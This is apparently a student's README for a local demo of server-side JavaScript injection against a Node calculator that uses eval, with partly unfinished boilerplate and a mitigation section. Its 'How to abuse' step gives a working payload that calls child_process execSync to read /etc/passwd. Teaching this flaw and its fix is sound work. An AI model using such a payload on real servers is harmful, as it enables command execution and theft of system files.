# GREETINGS AND SALUTATIONS 

This is the readme for my demo of "Serverside JS code injection"
The readme should contain a step-by-step guide on how to run the demo, and how to exploit it, preferrably with examples of expected results and stuff.

TODO: Rewrite the following sections/points to describe the SSJSi instead of CSRF. 

#NB: Everything under this is boilerplate text from the CSRF readme. To be fixed when writing my own documentation. 
1. How to run.
- Usually run with:
<code>$ node <my_project_file>.js</code>
or
<code>$ nodemon <my_project_file>.js</code>
... if you wanna monitor for changes.

2. How to use
- Depends on the project

3. How to abuse
- Depends on the project

4. How to verify result
- Depends on the project


## old_vulnerable_calc_eval.js

### Prerequisites:
Having Node installed is sufficient to run the applicaiton.
(Ithink) The application can be exploited without any extra tools

**1. How to run:**

Run the demo.js file:
<code>$ node old_vulnerable_calc_eval.js </code>

Verify from the terminal output that the execution went well

**2. How to use:**

Go to http://127.0.0.1:3000
Try to use the calculator, like writing in 1+1 or something


**3. How to abuse:**
Pick a payload from the file "exploits.js" in the repo. For example, we could start by reading the /etc/passwd file:
<code> function getFiles(){const execSync = require('child_process').execSync; const output = execSync('cat ../../../../../../etc/passwd', { encoding: 'utf-8'}); return output;} getFiles() </code>


**4. How to verify the result:**

You should see the contents of the /etc/passwd file in the browser window. If there is an error message instead, go debugging.

### **...Profit**

## Mitigation 
This vulnerability is kinda trivial to mitigate in our case. If we decide that the allowed input should only be numbers, we can add a serverside check to verify that the userinput are numbers, and then respond accordingly.  
To see an example of how this vulnerability can be mitigated, follow the guide above, but run <code>safe_calc_eval.js</code> instead.
By trying to replicate the exploit, you will get an error message instead.  
